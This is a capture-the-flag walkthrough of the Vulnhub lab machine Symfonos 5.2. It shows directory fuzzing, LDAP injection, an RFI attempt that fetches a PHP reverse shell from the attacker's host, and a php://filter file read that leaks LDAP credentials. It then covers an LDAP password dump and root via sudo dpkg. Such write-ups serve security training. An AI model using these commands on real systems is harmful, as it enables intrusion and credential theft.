---
title: Vulnhub - Symfonos 5.2
categories: [Vulnhub, Linux]
date: 2022-02-07
tags: [exploit/ldap-injection, exploit/file-inclusion/lfi, linux-priv-esc/sudo/gtfo-bin, tcp/389-636-ldap ]
img_path: /Writeups/Vulnhub/Linux/Symfonos 5.2/images/
image:
  src: Pasted%20image%2020220207024507.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Recon

## TCP/80 (HTTP)

### FFUF - common.txt

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2]
â””â”€# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.18/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.hta.html               [Status: 403, Size: 279, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10]
.htaccess.html          [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd.html          [Status: 403, Size: 279, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd.php           [Status: 403, Size: 279, Words: 20, Lines: 10]
admin.php               [Status: 200, Size: 1650, Words: 707, Lines: 40]
admin.php               [Status: 200, Size: 1650, Words: 707, Lines: 40]
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10]
.html                   [Status: 403, Size: 279, Words: 20, Lines: 10]
                        [Status: 200, Size: 207, Words: 18, Lines: 19]
.hta.txt                [Status: 403, Size: 279, Words: 20, Lines: 10]
.hta.php                [Status: 403, Size: 279, Words: 20, Lines: 10]
.htaccess.txt           [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]
.htaccess.php           [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd.txt           [Status: 403, Size: 279, Words: 20, Lines: 10]
home.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
index.html              [Status: 200, Size: 207, Words: 18, Lines: 19]
index.html              [Status: 200, Size: 207, Words: 18, Lines: 19]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
static                  [Status: 301, Size: 317, Words: 20, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 1544 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

- `admin.php`

### FFUF - directory-list-2.3-medium.txt

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2]
â””â”€# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.html,.txt,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.18/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

home.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
static                  [Status: 301, Size: 317, Words: 20, Lines: 10]
admin.php               [Status: 200, Size: 1650, Words: 707, Lines: 40]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
portraits.php           [Status: 200, Size: 165, Words: 10, Lines: 4]
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10]
                        [Status: 200, Size: 207, Words: 18, Lines: 19]
.html                   [Status: 403, Size: 279, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
:: Progress: [882240/882240] :: Job [1/1] :: 4221 req/sec :: Duration: [0:03:44] :: Errors: 0 ::
```

- `portraits.php`
- `home.php`

# Initial Foothold

## TCP/80 (HTTP) - LDAP Injection

1. View enumerated directories
	- `admin.php`
		![](Pasted%20image%2020220207032801.png)
	- `portraits.php`
		![](Pasted%20image%2020220207032845.png)
	- `home.php`
		- redirected to `admin.php`
2. Determine if `admin.php` is susceptible to SQLi, failed
	- Results
	![](Pasted%20image%2020220207034119.png)
3. Tried admin:admin, failed
4. Determine if `admin.php` is susceptible to LDAP Injection, since `TCP/389,636 - LDAP` is up
	- [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection) is an attack used to exploit web based applications that construct LDAP statements based on user input, when fails to properly sanitize user input, itâ€™s possible to modify LDAP statements to bypass login, execute commands.
	- Setup
		![](Pasted%20image%2020220207034546.png)
	- Results
		![](Pasted%20image%2020220207034614.png)

## TCP/80 (HTTP) - File Inclusion

1. Redirected to `home.php`
	![](Pasted%20image%2020220207034927.png)
	- `url=http://127.0.0.1/portraits.php`
		- Could be susceptible to LFI/RFI

2. RFI2RCE - Failed
	1. Download [`php-reverse-shell.php`](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
	2. Start a webserver hosting `php-reverse-shell.php`

		```
		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit]
		â””â”€# python3 -m http.server 80
		Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
		```

	3. Download `php-revrese-shell.php` into the victim

		```
		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/loot/http]
		â””â”€# curl -H "Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0" http://symfonos.local/home.php?url=http://192.168.110.4/php-reverse-shell.php
		
		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit]
		â””â”€# python3 -m http.server 80
		Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
		192.168.110.18 - - [07/Feb/2022 03:55:58] "GET /php-reverse-shell.php HTTP/1.0" 200 -
		```

	4. Execute reverse shell

		```
		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit]
		â””â”€# curl -H "Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0" http://symfonos.local/home.php?url=http://192.168.110.4/php-reverse-shell.php?
		```

		- Failed, php code is not executed.
3. LFI2RCE - Failed
	1. Fuzz for files in include that could lead to RCE

		```
		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit]
		â””â”€# ffuf -u "http://symfonos.local/home.php?url=../../../../../..FUZZ" -H "Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0" -w /usr/share/wordlists/LFI/file_inclusion_linux.txt  -fw 117
		```

		- Browse through the files, could not find any that leads to RCE
4.  Instead of doing RFI, use `PHP wrapper` to view the source code `login.php`
	-  Able to obtain LDAP credentials
	
	1.  Base64 Encode `home.php`

		```
		# Payload: ?url=php://filter/convert.base64-encode/resource=admin.php

		â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit]
		â””â”€# curl -s -H "Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0" 'http://symfonos.local/home.php?url=php://filter/convert.base64-encode/resource=login.php' |  curl -s -H "Cookie: PHPSESSID=m8sk1907nbfha3ohu1fvls6jp0" 'http://symfonos.local/home.php?url=php://filter/convert.base64-encode/resource=admin.php' | tail -3
		<center>
		PD9waHAKc2Vzc2lvbl9zdGFydCgpOwoKaWYoaXNzZXQoJF9TRVNTSU9OWyJsb2dnZWRpbiJdKSAmJiAkX1NFU1NJT05bImxvZ2dlZGluIl0gPT09IHRydWUpewogICAgaGVhZGVyKCJsb2NhdGlvbjogaG9tZS5waHAiKTsKICAgIGV4aXQ7Cn0KCmZ1bmN0aW9uIGF1dGhMZGFwKCR1c2VybmFtZSwgJHBhc3N3b3JkKSB7CiAgJGxkYXBfY2ggPSBsZGFwX2Nvbm5lY3QoImxkYXA6Ly8xNzIuMTguMC4yMiIpOwoKICBsZGFwX3NldF9vcHRpb24oJGxkYXBfY2gsIExEQVBfT1BUX1BST1RPQ09MX1ZFUlNJT04sIDMpOwoKICBpZiAoISRsZGFwX2NoKSB7CiAgICByZXR1cm4gRkFMU0U7CiAgfQoKICAkYmluZCA9IGxkYXBfYmluZCgkbGRhcF9jaCwgImNuPWFkbWluLGRjPXN5bWZvbm9zLGRjPWxvY2FsIiwgInFNRGR5WmgzY1Q2ZWVBV0QiKTsKCiAgaWYgKCEkYmluZCkgewogICAgcmV0dXJuIEZBTFNFOwogIH0KCiAgJGZpbHRlciA9ICIoJih1aWQ9JHVzZXJuYW1lKSh1c2VyUGFzc3dvcmQ9JHBhc3N3b3JkKSkiOwogICRyZXN1bHQgPSBsZGFwX3NlYXJjaCgkbGRhcF9jaCwgImRjPXN5bWZvbm9zLGRjPWxvY2FsIiwgJGZpbHRlcik7CgogIGlmICghJHJlc3VsdCkgewogICAgcmV0dXJuIEZBTFNFOwogIH0KCiAgJGluZm8gPSBsZGFwX2dldF9lbnRyaWVzKCRsZGFwX2NoLCAkcmVzdWx0KTsKCiAgaWYgKCEoJGluZm8pIHx8ICgkaW5mb1siY291bnQiXSA9PSAwKSkgewogICAgcmV0dXJuIEZBTFNFOwogIH0KCiAgcmV0dXJuIFRSVUU7Cgp9CgppZihpc3NldCgkX0dFVFsndXNlcm5hbWUnXSkgJiYgaXNzZXQoJF9HRVRbJ3Bhc3N3b3JkJ10pKXsKCiR1c2VybmFtZSA9IHVybGRlY29kZSgkX0dFVFsndXNlcm5hbWUnXSk7CiRwYXNzd29yZCA9IHVybGRlY29kZSgkX0dFVFsncGFzc3dvcmQnXSk7CgokYklzQXV0aCA9IGF1dGhMZGFwKCR1c2VybmFtZSwgJHBhc3N3b3JkKTsKCmlmICghICRiSXNBdXRoICkgewoJJG1zZyA9ICJJbnZhbGlkIGxvZ2luIjsKfSBlbHNlIHsKICAgICAgICAkX1NFU1NJT05bImxvZ2dlZGluIl0gPSB0cnVlOwoJaGVhZGVyKCJsb2NhdGlvbjogaG9tZS5waHAiKTsKCWV4aXQ7Cn0KfQo/Pgo8aHRtbD4KPGhlYWQ+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdGF0aWMvYm9vdHN0cmFwLm1pbi5jc3MiPgo8L2hlYWQ+Cjxib2R5PjxiciAvPgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTgiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPkxvZ2luPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSJhZG1pbi5waHAiIG1ldGhvZD0iR0VUIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJlbWFpbF9hZGRyZXNzIiBjbGFzcz0iY29sLW1kLTQgY29sLWZvcm0tbGFiZWwgdGV4dC1tZC1yaWdodCI+VXNlcm5hbWU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC02Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJ1c2VybmFtZSIgY2xhc3M9ImZvcm0tY29udHJvbCIgbmFtZT0idXNlcm5hbWUiIHJlcXVpcmVkIGF1dG9mb2N1cz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwYXNzd29yZCIgY2xhc3M9ImNvbC1tZC00IGNvbC1mb3JtLWxhYmVsIHRleHQtbWQtcmlnaHQiPlBhc3N3b3JkPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJwYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtNiBvZmZzZXQtbWQtNCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2dpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPgoJCQkgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICA8L2Rpdj4KPGNlbnRlcj48c3Ryb25nPjw/cGhwIGVjaG8gJG1zZzsgPz48L3N0cm9uZz48L2NlbnRlcj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgoK</center>
		</body>
		```

	2. Decoded
		![](Pasted%20image%2020220207044212.png)
		- `cn=admin,dc=symfonos,dc=local`:qMDdyZh3cT6eeAWD

## TCP/389 (LDAP) - Extract Info from LDAP

1. Extract all information from domain

	```
	â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit]
	â””â”€# ldapsearch -x -h $ip -D 'cn=admin,dc=symfonos,dc=local' -w qMDdyZh3cT6eeAWD -b 'dc=symfonos,dc=local'
	# extended LDIF
	#
	# LDAPv3
	# base <dc=symfonos,dc=local> with scope subtree
	# filter: (objectclass=*)
	# requesting: ALL
	#

	# symfonos.local
	dn: dc=symfonos,dc=local
	objectClass: top
	objectClass: dcObject
	objectClass: organization
	o: symfonos
	dc: symfonos

	# admin, symfonos.local
	dn: cn=admin,dc=symfonos,dc=local
	objectClass: simpleSecurityObject
	objectClass: organizationalRole
	cn: admin
	description: LDAP administrator
	userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=

	# zeus, symfonos.local
	dn: uid=zeus,dc=symfonos,dc=local
	uid: zeus
	cn: zeus
	sn: 3
	objectClass: top
	objectClass: posixAccount
	objectClass: inetOrgPerson
	loginShell: /bin/bash
	homeDirectory: /home/zeus
	uidNumber: 14583102
	gidNumber: 14564100
	userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
	mail: zeus@symfonos.local
	gecos: Zeus User

	# search result
	search: 2
	result: 0 Success

	# numResponses: 4
	# numEntries: 3
	```

2. Decode password

	```
	â”Œâ”€â”€(rootðŸ’€kali)-[~/vulnHub/Symfonos-5.2/192.168.110.18/exploit]
	â””â”€# echo -n  Y2V0a0tmNHdDdUhDOUZFVA== | base64 -d
	cetkKf4wCuHC9FET
	```

	- zeus:cetkKf4wCuHC9FET

## TCP/22 (SSH)

1. SSH w/ zeus:cetkKf4wCuHC9FET
	![](Pasted%20image%2020220207050030.png)

# Privilege Escalation

## Root - Via Sudo (GTFO Bins)

1. Check sudo access

	```
	zeus@symfonos5:~$ sudo -l
	Matching Defaults entries for zeus on symfonos5:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User zeus may run the following commands on symfonos5:
		(root) NOPASSWD: /usr/bin/dpkg
	```

	- `dpkg` has a [GTFOBins](https://gtfobins.github.io/gtfobins/dpkg/#sudo) entry
2. Exploit

	```
	sudo dpkg -l
	!/bin/sh	
	```

	![](Pasted%20image%2020220207050518.png)

3. Root Flag

	```
	# cd /root
	# ls
	proof.txt
	# cat proof.txt

				Congrats on rooting symfonos:5!

									   ZEUS
				  *      .            dZZZZZ,       .          *
									 dZZZZ  ZZ,
		 *         .         ,AZZZZZZZZZZZ  `ZZ,_          *
						,ZZZZZZV'      ZZZZ   `Z,`\
					  ,ZZZ    ZZ   .    ZZZZ   `V
			*      ZZZZV'     ZZ         ZZZZ    \_              .
	.              V   l   .   ZZ        ZZZZZZ          .
				   l    \       ZZ,     ZZZ  ZZZZZZ,
	   .          /            ZZ l    ZZZ    ZZZ `Z,
							  ZZ  l   ZZZ     Z Z, `Z,            *
					.        ZZ      ZZZ      Z  Z, `l
							 Z        ZZ      V  `Z   \
							 V        ZZC     l   V
			   Z             l        V ZR        l      .
				\             \       l  ZA
								\         C          C
									  \   K   /    /             K
							  A    \   \  |  /  /              /
							   \        \\|/ /  /
	   __________________________________\|/_________________________
			Contact me via Twitter @zayotic to give feedback!

	# 
	```
